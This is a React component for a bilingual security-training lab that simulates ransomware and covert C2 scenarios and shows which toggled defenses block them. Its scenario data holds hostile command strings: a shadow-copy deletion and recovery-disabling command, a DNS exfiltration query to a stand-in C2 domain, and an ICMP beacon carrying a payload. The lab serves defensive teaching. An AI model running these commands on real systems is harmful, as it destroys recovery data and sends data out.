import React, { useState, useMemo } from 'react';
import {
  Skull,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Zap,
  Terminal,
  Activity,
  FileText,
  Play,
  RefreshCw,
  Lock,
  Unlock,
  AlertTriangle,
  Radio,
  FileCode,
} from 'lucide-react';

interface RansomwareC2LabProps {
  language?: 'ar' | 'en';
}

interface RansomwareScenario {
  id: string;
  nameEn: string;
  nameAr: string;
  category: 'VSS_HYBRID_ENCRYPT' | 'DNS_TUNNEL_EXFIL' | 'ICMP_COVERT_BEACON';
  commandLine: string;
  exfilArtifact: string;
  descriptionEn: string;
  descriptionAr: string;
  isThreat: boolean;
}

const RANSOMWARE_SCENARIOS: RansomwareScenario[] = [
  {
    id: 'RANSOM-01',
    nameEn: 'Volume Shadow Wipe & ChaCha20 Hybrid Encryption',
    nameAr: 'حذف النسخ الاحتياطية للظل والتشفير الهجين ChaCha20',
    category: 'VSS_HYBRID_ENCRYPT',
    commandLine: 'vssadmin.exe delete shadows /all /quiet & bcdedit /set {default} recoveryenabled No',
    exfilArtifact: 'Target: C:\\Users\\*\\Documents [3,420 files encrypted with .LOCKED extension, RansomNote.txt dropped]',
    descriptionEn: 'Ransomware deletes all local shadow copies to inhibit recovery, then executes high-speed ChaCha20 multithreaded file encryption.',
    descriptionAr: 'برمجية الفدية تحذف النسخ الاحتياطية للنظام فورياً ثم تشفر الملفات بخوارزمية ChaCha20 فائقة السرعة.',
    isThreat: true,
  },
  {
    id: 'RANSOM-02',
    nameEn: 'Stealth DNS Tunneling Base64 Exfiltration',
    nameAr: 'نفق DNS الخفي لتهريب الملفات الحساسة بدون كشف',
    category: 'DNS_TUNNEL_EXFIL',
    commandLine: 'nslookup Q29ycG9yYXRlX1BheXJvbGw=.chunk01.exfil.darknet-c2.org 8.8.8.8',
    exfilArtifact: 'Exfiltrated 45MB financial DB records chunked into recursive DNS TXT/CNAME query payloads.',
    descriptionEn: 'Malware chunks sensitive confidential documents into base64 subdomain queries, exfiltrating data past strict egress firewalls.',
    descriptionAr: 'تقسم البرمجية الوثائق إلى أجزاء Base64 داخل استعلامات DNS لتهريبها متجاوزة جدران الحماية الصارمة.',
    isThreat: true,
  },
  {
    id: 'RANSOM-03',
    nameEn: 'Covert ICMP Ping Echo Beaconing Channel',
    nameAr: 'قناة اتصال C2 السرية عبر حزم بنج ICMP المضمنة',
    category: 'ICMP_COVERT_BEACON',
    commandLine: 'ping -p 63325f636d645f65786563 198.51.100.24 (Encrypted Command embedded in ICMP Data)',
    exfilArtifact: 'C2 beacon instructions received: "EXECUTE_PRIV_ESC_MIMIKATZ" inside ICMP type 8 echo request payload.',
    descriptionEn: 'Adversary leverages raw ICMP data padding field to establish stealthy command and control beacon without opening TCP/UDP sockets.',
    descriptionAr: 'المهاجم يستغل حقل بيانات ICMP لتلقي أوامر القيادة والسيطرة خفية دون فتح منافذ TCP/UDP مشبوهة.',
    isThreat: true,
  },
];

export const RansomwareC2Lab: React.FC<RansomwareC2LabProps> = ({ language = 'en' }) => {
  const isAr = language === 'ar';

  const [selectedScenarioId, setSelectedScenarioId] = useState<string>('RANSOM-01');
  const [isSimulating, setIsSimulating] = useState<boolean>(false);
  const [executionLog, setExecutionLog] = useState<{
    status: 'RANSOMWARE_DEFENSE_TRIGGERED' | 'SYSTEM_COMPROMISED_LOCKED';
    details: string;
    actionTaken: string;
    activeDefenses: string[];
  } | null>(null);

  // Defenses
  const [defenseCanaryHoneypots, setDefenseCanaryHoneypots] = useState<boolean>(false);
  const [defenseDnsEntropyFilter, setDefenseDnsEntropyFilter] = useState<boolean>(false);
  const [defenseIcmpPayloadInspection, setDefenseIcmpPayloadInspection] = useState<boolean>(false);

  const scenario = useMemo(
    () => RANSOMWARE_SCENARIOS.find((r) => r.id === selectedScenarioId) || RANSOMWARE_SCENARIOS[0],
    [selectedScenarioId]
  );

  const handleRunRansomwareSimulation = () => {
    setIsSimulating(true);
    setExecutionLog(null);

    setTimeout(() => {
      const activeDefenses: string[] = [];
      let isBlocked = false;

      if (scenario.category === 'VSS_HYBRID_ENCRYPT' && defenseCanaryHoneypots) {
        activeDefenses.push('Canary Honeypot Triggered: Instant Process Tree SIGKILL & VSS Rollback');
        isBlocked = true;
      } else if (scenario.category === 'DNS_TUNNEL_EXFIL' && defenseDnsEntropyFilter) {
        activeDefenses.push('DNS Tunneling Detector: High-Entropy Base64 Subdomain Query Anomaly Block');
        isBlocked = true;
      } else if (scenario.category === 'ICMP_COVERT_BEACON' && defenseIcmpPayloadInspection) {
        activeDefenses.push('Deep Packet Inspection: Non-Standard ICMP Echo Data Padding Dropped');
        isBlocked = true;
      }

      if (isBlocked) {
        setExecutionLog({
          status: 'RANSOMWARE_DEFENSE_TRIGGERED',
          details: isAr
            ? 'تم إحباط هجوم الفدية / قناة C2 فورياً! قتلت المصيدة العملية المشبوهة وحمت الملفات.'
            : 'EARLY DEFENSE TRIGGERED: Canary tripped or tunneling dropped. Attacker process terminated via SIGKILL.',
          actionTaken: isAr ? 'الملفات في أمان تام: تم تجميد التشفير قبل وصوله للبيانات الحقيقية.' : 'Zero data encrypted. Network exfiltration channel neutralized.',
          activeDefenses,
        });
      } else {
        setExecutionLog({
          status: 'SYSTEM_COMPROMISED_LOCKED',
          details: isAr
            ? 'تحذير: تم تشفير الملفات أو تهريب البيانات الحساسة عبر القناة السرية!'
            : 'CRITICAL RANSOMWARE / C2 EXPLOIT: Volume shadows wiped, files encrypted, or confidential data exfiltrated!',
          actionTaken: scenario.exfilArtifact,
          activeDefenses: [],
        });
      }

      setIsSimulating(false);
    }, 400);
  };

  return (
    <div className="flex-1 flex flex-col h-full bg-slate-950 text-slate-100 overflow-y-auto p-4 space-y-4 font-mono select-none">
      {/* Header Banner */}
      <div className="bg-slate-900 border border-slate-800 rounded-lg p-4 flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="p-2.5 bg-rose-500/10 border border-rose-500/30 rounded-lg text-rose-400">
            <Skull className="w-6 h-6" />
          </div>
          <div>
            <h2 className="text-lg font-bold text-slate-100 flex items-center gap-2">
              {isAr ? 'مختبر محاكاة برمجيات الفدية وقنوات القيادة والسيطرة (Ransomware & Stealth C2)' : 'Ransomware & Stealth C2 Emulation Security Laboratory'}
              <span className="px-2 py-0.5 text-[10px] text-rose-400 bg-rose-950/60 border border-rose-800 rounded-full font-mono">
                MITRE ATT&CK T1486 / T1071
              </span>
            </h2>
            <p className="text-xs text-slate-400 mt-0.5">
              {isAr
                ? 'محاكاة تشفير الفدية الهجين، ومسح النسخ الاحتياطية VSS، ونفق DNS لتهريب البيانات، ومصائد Canary.'
                : 'Interactive ChaCha20 ransomware kill chain, DNS tunneling exfiltration, ICMP beacons, and Canary honeypots.'}
            </p>
          </div>
        </div>

        <div className="flex items-center gap-2 text-xs text-slate-400">
          <span>{isAr ? 'حالة حماية الملفات:' : 'File Integrity Sensor:'}</span>
          <span className="px-2 py-1 bg-emerald-950 border border-emerald-800 text-emerald-300 rounded font-bold">
            CANARY HONEYPOTS DEPLOYED
          </span>
        </div>
      </div>

      {/* Main Grid: Attack Vector Selection + Ransomware Execution Console */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-4 flex-1">
        {/* Left Column: Attack Vector Selector + Defenses */}
        <div className="lg:col-span-5 bg-slate-900/80 border border-slate-800 rounded-lg p-4 flex flex-col space-y-3">
          <h3 className="text-sm font-bold text-slate-200 flex items-center gap-2 uppercase tracking-wider">
            <Zap className="w-4 h-4 text-amber-400" />
            {isAr ? 'سيناريوهات هجمات الفدية و C2' : 'Ransomware & C2 Vectors'}
          </h3>

          <div className="space-y-2 overflow-y-auto max-h-[320px] pr-1">
            {RANSOMWARE_SCENARIOS.map((sc) => {
              const isSelected = sc.id === selectedScenarioId;
              return (
                <button
                  key={sc.id}
                  onClick={() => setSelectedScenarioId(sc.id)}
                  className={`w-full text-left p-3 rounded-lg border text-xs transition-all flex flex-col space-y-1.5 ${
                    isSelected
                      ? 'bg-rose-950/50 border-rose-500 text-slate-100 shadow-md shadow-rose-950/40'
                      : 'bg-slate-950/60 border-slate-800/80 text-slate-400 hover:border-slate-700 hover:text-slate-200'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-rose-400">{sc.id}</span>
                    <span className="px-1.5 py-0.5 text-[9px] bg-slate-900 border border-slate-800 text-slate-300 rounded font-semibold">
                      {sc.category}
                    </span>
                  </div>
                  <span className="font-semibold text-slate-200">{isAr ? sc.nameAr : sc.nameEn}</span>
                  <p className="text-[11px] text-slate-400 line-clamp-2 leading-relaxed">
                    {isAr ? sc.descriptionAr : sc.descriptionEn}
                  </p>
                </button>
              );
            })}
          </div>

          {/* Defenses Panel */}
          <div className="pt-3 border-t border-slate-800 space-y-2">
            <h4 className="text-xs font-bold text-emerald-400 flex items-center gap-2 uppercase tracking-wider">
              <Shield className="w-4 h-4 text-emerald-400" />
              {isAr ? 'دروع التصدي للفدية وقنوات C2' : 'Ransomware Defenses'}
            </h4>

            <div className="space-y-2 text-xs">
              <label className="flex items-center justify-between p-2 bg-slate-950 border border-slate-800 rounded cursor-pointer hover:border-slate-700">
                <span className="text-slate-300">{isAr ? 'مصائد Canary Honeypots والقتل الفوري للعمليات' : 'Canary Honeypot Files & Instant Process Kill'}</span>
                <input
                  type="checkbox"
                  checked={defenseCanaryHoneypots}
                  onChange={(e) => setDefenseCanaryHoneypots(e.target.checked)}
                  className="rounded border-slate-700 bg-slate-900 text-rose-500 focus:ring-0"
                />
              </label>

              <label className="flex items-center justify-between p-2 bg-slate-950 border border-slate-800 rounded cursor-pointer hover:border-slate-700">
                <span className="text-slate-300">{isAr ? 'كاشف نفق DNS القائم على قياس الإنتروبيا' : 'DNS Tunneling Entropy & Rate Limiter'}</span>
                <input
                  type="checkbox"
                  checked={defenseDnsEntropyFilter}
                  onChange={(e) => setDefenseDnsEntropyFilter(e.target.checked)}
                  className="rounded border-slate-700 bg-slate-900 text-rose-500 focus:ring-0"
                />
              </label>

              <label className="flex items-center justify-between p-2 bg-slate-950 border border-slate-800 rounded cursor-pointer hover:border-slate-700">
                <span className="text-slate-300">{isAr ? 'فحص حزم ICMP العميقة وإسقاط الحمولات' : 'Deep Packet Inspection on ICMP Data'}</span>
                <input
                  type="checkbox"
                  checked={defenseIcmpPayloadInspection}
                  onChange={(e) => setDefenseIcmpPayloadInspection(e.target.checked)}
                  className="rounded border-slate-700 bg-slate-900 text-rose-500 focus:ring-0"
                />
              </label>
            </div>
          </div>
        </div>

        {/* Right Column: Execution Shell & Live Telemetry */}
        <div className="lg:col-span-7 bg-slate-900/80 border border-slate-800 rounded-lg p-4 flex flex-col space-y-4">
          <div className="flex items-center justify-between border-b border-slate-800 pb-2">
            <h3 className="text-sm font-bold text-slate-200 flex items-center gap-2">
              <Terminal className="w-4 h-4 text-rose-400" />
              {isAr ? 'منصة تنفيذ ومحاكاة هجوم الفدية' : 'Ransomware Execution Console'}
            </h3>
            <button
              onClick={handleRunRansomwareSimulation}
              disabled={isSimulating}
              className="px-4 py-1.5 bg-rose-600 hover:bg-rose-500 text-white rounded text-xs font-bold transition-all flex items-center gap-2 shadow border border-rose-400/30 disabled:opacity-50"
            >
              {isSimulating ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5 fill-current" />}
              {isAr ? 'تنفيذ محاكاة الهجوم' : 'Execute Ransomware Action'}
            </button>
          </div>

          <div className="bg-slate-950 border border-slate-800 rounded p-3 text-xs font-mono space-y-1">
            <span className="text-slate-400 font-bold block">{isAr ? 'الأمر المنفذ في سطر الأوامر:' : 'Triggered Adversarial Command:'}</span>
            <span className="text-rose-400 font-bold">{scenario.commandLine}</span>
          </div>

          {/* Execution Telemetry Log */}
          <div className="flex-1 bg-slate-950 border border-slate-800 rounded-lg p-4 flex flex-col space-y-3 min-h-[220px]">
            <div className="flex items-center justify-between border-b border-slate-800/80 pb-2 text-xs">
              <span className="font-bold text-slate-300">{isAr ? 'سجل مراقبة سلامة الملفات وشبكة C2' : 'Host Integrity & C2 Telemetry Stream'}</span>
            </div>

            {executionLog ? (
              <div className="space-y-3 text-xs font-mono">
                <div
                  className={`p-3 rounded border ${
                    executionLog.status === 'RANSOMWARE_DEFENSE_TRIGGERED'
                      ? 'bg-emerald-950/40 border-emerald-800 text-emerald-300'
                      : 'bg-rose-950/50 border-rose-800 text-rose-200'
                  }`}
                >
                  <div className="font-bold mb-1 flex items-center gap-2">
                    {executionLog.status === 'RANSOMWARE_DEFENSE_TRIGGERED' ? (
                      <>
                        <ShieldCheck className="w-4 h-4 text-emerald-400" />
                        <span>{isAr ? 'تم إحباط هجوم الفدية وحماية الملفات' : 'RANSOMWARE HALTED - CANARY TRIGGERED'}</span>
                      </>
                    ) : (
                      <>
                        <ShieldAlert className="w-4 h-4 text-rose-400" />
                        <span>{isAr ? 'إنذار: تم تشفير الملفات أو تهريب البيانات!' : 'RANSOMWARE COMPROMISE DETECTED'}</span>
                      </>
                    )}
                  </div>
                  {executionLog.details}
                </div>

                <div className="p-2.5 bg-slate-900 border border-slate-800 text-slate-300 rounded text-[11px]">
                  {executionLog.actionTaken}
                </div>
              </div>
            ) : (
              <div className="flex-1 flex flex-col items-center justify-center text-slate-500 space-y-2 py-8">
                <Skull className="w-8 h-8 text-slate-600 animate-pulse" />
                <p className="text-xs">
                  {isAr
                    ? 'اختر سيناريو وانقر على "تنفيذ محاكاة الهجوم" لمعاينة استجابة مصائد Canary وجدار الحماية.'
                    : 'Select a ransomware scenario and click "Execute Ransomware Action".'}
                </p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
